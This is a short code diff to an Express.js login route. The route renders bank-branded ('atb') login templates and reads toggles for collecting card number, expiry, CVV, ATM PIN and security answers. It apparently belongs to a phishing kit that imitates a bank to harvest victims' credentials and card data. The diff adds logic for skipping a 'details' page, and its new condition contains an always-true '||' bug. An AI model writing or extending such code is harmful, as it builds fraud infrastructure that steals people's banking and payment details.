@@ -11,17 +11,23 @@ router.get('/login', async (req, res) => {
         const getId = 1; // Since we're always dealing with the record with id = 1
         const result = await pool.query('SELECT data FROM items WHERE id = $1', [getId]);
         let count = 0
+        let countRmvDetailsPage = 0
         let rmvDetailsPage = false
 
         Object.keys(result.rows[0].data.settings.atb).forEach(key => {
             if (result.rows[0].data.settings.atb[key] === 'off') {
               count++;
-              if(count == 10 && key != 'card' && key != 'exp' && key != 'cvv' && key != 'atm'){
-                console.log("remove details page")
-              }
+              if(key != 'card' || key != 'exp' || key != 'cvv' || key != 'atm'){
+                console.log(key);
+                countRmvDetailsPage++;
+              } 
             }
         });
 
+        if(countRmvDetailsPage == 10){
+            console.log('removeDetails');
+            rmvDetailsPage = true
+        }
         
         if (result.rows[0].data.settings.atb.qa > 0) {
             res.render('bank/atb/login/index', { navig: "/atb/qst" });
